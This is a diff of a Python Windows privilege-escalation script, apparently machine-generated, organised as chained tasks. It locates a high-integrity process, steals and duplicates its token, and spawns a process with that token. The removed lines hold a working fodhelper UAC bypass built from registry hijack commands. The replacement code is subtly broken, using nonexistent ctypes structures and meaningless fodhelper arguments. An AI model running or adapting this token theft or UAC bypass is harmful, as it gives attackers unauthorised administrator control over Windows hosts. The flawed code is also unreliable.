@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-import sys, json, time, subprocess
+import sys, json, time
+import subprocess
 from typing import Dict, Any
 import ctypes
 import win32api
@@ -9,29 +10,37 @@ import os
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    result = {'process_id': None, 'integrity_level': None}
     try:
-        # Use PowerShell to get processes with their integrity levels
+        # Command to list processes with their integrity levels
         command = [
-            'powershell', '-Command',
-            "Get-WmiObject Win32_Process | Select-Object ProcessId, Name, @{Name='IntegrityLevel';Expression={(Get-Process $_.ProcessId).GetOwner().User}}"
+            'powershell', 
+            '-Command', 
+            'Get-WmiObject Win32_Process | Select-Object ProcessId, Name, @{Name="IntegrityLevel";Expression={(Get-Process $_.ProcessId).GetOwner().User}}'
         ]
-        completed_process = subprocess.run(command, capture_output=True, text=True, timeout=10)
         
-        if completed_process.returncode == 0:
-            output = completed_process.stdout
-            for line in output.splitlines():
-                if 'High' in line:
-                    parts = line.split()
-                    process_id = int(parts[0])
-                    integrity_level = 'High'
-                    result = {'process_id': process_id, 'integrity_level': integrity_level}
-                    break
-
-        return {'success': True, 'data': result,
+        # Execute the command
+        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
+        
+        # Parse the output
+        process_info = None
+        for line in result.stdout.splitlines():
+            if 'High' in line:
+                parts = line.split()
+                process_id = int(parts[0])
+                integrity_level = 'High'
+                process_info = {'process_id': process_id, 'integrity_level': integrity_level}
+                break
+        
+        # If no high integrity process found, return partial with None values
+        if not process_info:
+            process_info = {'process_id': None, 'integrity_level': None}
+        
+        return {'success': True, 'data': process_info,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
+        # Return partial data with None values on failure
+        return {'success': False, 'data': {'process_id': None, 'integrity_level': None},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -41,7 +50,7 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         process_id = input_data.get('process_id')
         integrity_level = input_data.get('integrity_level')
 
-        # Open the process with the required access rights
+        # Open the process with required access rights
         process_handle = win32api.OpenProcess(
             win32security.PROCESS_QUERY_INFORMATION, False, process_id
         )
@@ -53,7 +62,7 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         )
 
         # Duplicate the token
-        duplicated_token = win32security.DuplicateTokenEx(
+        duplicated_token_handle = win32security.DuplicateTokenEx(
             token_handle,
             win32security.SecurityImpersonation,
             win32security.TOKEN_ALL_ACCESS,
@@ -65,7 +74,7 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 
         # Return the duplicated token handle
         result = {
-            "token_handle": duplicated_token,
+            "token_handle": duplicated_token_handle,
             "success": True
         }
 
@@ -84,28 +93,45 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         token_handle = input_data.get('token_handle')
         success = input_data.get('success', False)
 
-        if not success or token_handle is None:
-            raise ValueError("Invalid token handle or unsuccessful token retrieval")
+        if not success:
+            raise ValueError("Token duplication was not successful.")
 
-        # Prepare the registry key for fodhelper.exe auto-elevation
-        reg_command = [
-            'reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command',
-            '/v', '', '/t', 'REG_SZ', '/d', 'cmd.exe', '/f'
+        # Prepare the command to run via fodhelper.exe
+        command = "fodhelper.exe"
+        params = "/c start notepad.exe"  # Example elevated process
+
+        # Use CreateProcessWithTokenW to spawn the process with the duplicated token
+        # This requires the use of ctypes to interact with Windows API
+        CreateProcessWithTokenW = ctypes.windll.advapi32.CreateProcessWithTokenW
+        CreateProcessWithTokenW.argtypes = [
+            ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.LPCWSTR,
+            ctypes.wintypes.LPCWSTR, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID,
+            ctypes.wintypes.LPCWSTR, ctypes.POINTER(ctypes.wintypes.STARTUPINFO),
+            ctypes.POINTER(ctypes.wintypes.PROCESS_INFORMATION)
         ]
-        subprocess.run(reg_command, check=True, timeout=10)
+        CreateProcessWithTokenW.restype = ctypes.wintypes.BOOL
 
-        # Set the DelegateExecute value to an empty string
-        reg_delegate_command = [
-            'reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command',
-            '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'
-        ]
-        subprocess.run(reg_delegate_command, check=True, timeout=10)
+        # Constants for CreateProcessWithTokenW
+        LOGON_WITH_PROFILE = 0x00000001
+        CREATE_NEW_CONSOLE = 0x00000010
 
-        # Execute fodhelper.exe to trigger the UAC bypass
-        process = subprocess.run(['fodhelper.exe'], check=True, timeout=10)
-        
-        # Check if the process was created successfully
-        result['process_id'] = process.pid
+        # Setup structures for process creation
+        startup_info = ctypes.wintypes.STARTUPINFO()
+        process_info = ctypes.wintypes.PROCESS_INFORMATION()
+
+        # Call CreateProcessWithTokenW
+        success = CreateProcessWithTokenW(
+            token_handle, LOGON_WITH_PROFILE, None, f"{command} {params}",
+            CREATE_NEW_CONSOLE, None, None, ctypes.byref(startup_info), ctypes.byref(process_info)
+        )
+
+        if not success:
+            raise RuntimeError("Failed to create process with token.")
+
+        # Retrieve process ID
+        process_id = process_info.dwProcessId
+
+        result['process_id'] = process_id
         result['elevated'] = True
 
         return {'success': True, 'data': result,
@@ -155,16 +181,16 @@ def main() -> dict:
         results['T2'] = {'success': False, 'error': str(e)}
         return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
-    # ── T3: Bypass UAC with Fodhelper [privilege-escalation] ──
+    # ── T3: Spawn Elevated Process [privilege-escalation] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Bypass UAC with Fodhelper): OK')
+            print(f'[+] T3 (Spawn Elevated Process): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Bypass UAC with Fodhelper): FAILED — {err}')
+            print(f'[-] T3 (Spawn Elevated Process): FAILED — {err}')
             failed.append('T3')
     except Exception as e:
         print(f'[!] T3 crashed: {e}')
